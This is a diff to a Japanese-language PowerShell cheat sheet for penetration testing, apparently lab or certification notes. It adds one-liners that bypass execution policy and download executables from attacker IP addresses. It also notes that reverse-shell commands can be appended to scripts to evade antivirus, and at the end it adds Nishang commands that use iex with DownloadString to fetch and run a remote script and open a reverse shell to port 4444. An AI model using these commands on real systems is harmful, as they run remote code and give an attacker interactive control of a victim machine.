@@ -14,7 +14,7 @@ Get-ExecutionPolicy -Scope CurrentUser
 ### ファイル転送
 
 ```powershell
-powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.11.0.4/wget.exe','C:\Users\offsec\Desktop\wget.exe')"
+powershell -NoProfile -ExecutionPolicy unrestricted　-c "(new-object System.Net.WebClient).DownloadFile('http://10.11.0.4/wget.exe','C:\Users\offsec\Desktop\wget.exe')"
 ```
 
 ```cmd
@@ -23,9 +23,11 @@ powershell -NoProfile -ExecutionPolicy unrestricted -Command (Invoke-WebRequest 
 
 
 
-##### ダウンロードせずに実行する場合は・・・
+### ダウンロードせずに実行する場合
 
-AVに検知されるので画像
+ps1の末尾に実行したいコマンドを記載して実行する。nishangのリバースシェルなど
+
+※AVに検知されるので画像
 
 ![image-20230105081915662](img/powershell/image-20230105081915662.png)
 
@@ -115,4 +117,18 @@ $dcsesh = New-PSSession -Computer SANDBOXDC
   Invoke-Command -Session $dcsesh -ScriptBlock {C:\Users\Public\whoami.exe}
   ```
 
-  
+
+
+
+https://www.hackingarticles.in/powershell-for-pentester-windows-reverse-shell/
+
+### Nishang
+
+```
+"iex(new-object net.webclient).downloadstring('http://192.168.119.133:8080/Invoke-PowerShellTcp.ps1')"
+```
+
+```
+powershell iex (New-Object Net.WebClient).DownloadString('http://192.168.1.3/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 192.168.1.3 -Port 4444
+```
+
